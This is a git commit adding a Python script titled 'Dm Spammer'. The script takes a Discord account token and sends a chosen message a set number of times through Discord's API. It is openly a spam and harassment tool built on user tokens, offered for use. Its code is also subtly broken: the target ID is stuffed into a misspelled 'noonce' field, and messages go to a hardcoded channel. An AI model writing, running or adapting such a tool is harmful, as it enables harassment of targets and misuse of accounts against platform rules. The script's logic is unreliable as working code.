8ce9ab854eee320509843a6ec62b4a9aa6d6fa5d
blob#0005 <88004068+blob0005@users.noreply.github.com>
2022-06-07 17:00:59 +0200

    Add files via upload

---
+++ main.py
@@ -0,0 +1,92 @@
+anyerror = False
+try:
+    import requests
+    import colorama
+except:
+  anyerror = True
+if anyerror == True:
+  print("Missing Module(s), Press Enter To Start Repair Process (Wont Always Work)")
+  input("")
+  try:
+    import os
+    os.system("pip install requests")
+    os.system("pip install colorama")
+    print("Problems Should Be Fixed Now, Restart The Program")
+    input("")
+    exit()
+  except:
+    print("Error While Fixing, Sorry")
+    input("")
+    exit()
+try:
+    import os
+    from os import system
+    system("title " + "Dm Spammer")
+except:
+    pass
+import time
+print("Dm Spammer")
+def spammer():
+    colorama.init(autoreset=True)
+    invite_code = "weYYXeUSNm"
+    while True:
+        tokens = input("Enter Token: ")
+        r1 = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": tokens})
+        if "200" not in str(r1):
+            print(colorama.Fore.RED + "Invalid Token")
+        if "200" in str(r1):
+            r = requests.get(f'https://discord.com/api/v6/invite/{invite_code}', headers={"Authorization": tokens})
+            if "200" in str(r):
+                break
+            if "403" in str(r):
+                print(colorama.Fore.YELLOW + "Locked Token")
+    while True:
+        try:
+            id = input("Enter Target Id: ")
+            id = int(id)
+            break
+        except:
+            print("Enter A Valid Choice")
+    msg = input("Enter Message To Spam: ")
+    while True:
+        try:
+            amount = input("Enter Amount Of Messages: ")
+            amount = int(amount)
+            amount = str(amount)
+            break
+        except:
+            print("Enter A Valid Choice")
+    while True:
+        try:
+            delay = input("Enter Delay (0 For None): ")
+            delay = float(delay)
+            break
+        except:
+            print("Enter A Valid Choice")
+    data = {
+        "content": msg,
+        "tts": False,
+        "noonce": int(id)
+    }
+    headers = {
+        "authorization": tokens
+    }
+    done = 0
+    while True:
+        r = requests.post("https://discord.com/api/v9/channels/981572125712338964/messages", data=data, headers=headers)
+        req = str(r)
+        res = r.json()
+        if "200" in req:
+            done = int(done) + 1
+            name = res["author"]["username"]
+            print(colorama.Fore.GREEN + "["+str(done)+"]" + " Succsesfully Sent Message To " + name)
+        if "429" in req:
+            print(colorama.Fore.RED + "Rate Limited")
+        if "429" not in req and "200" not in req:
+            print(colorama.Fore.RED + "Unkown Error, Code: " + req)
+        if str(done) == str(amount):
+            print("Done")
+            input("")
+            exit()
+        time.sleep(float(delay))
+spammer()
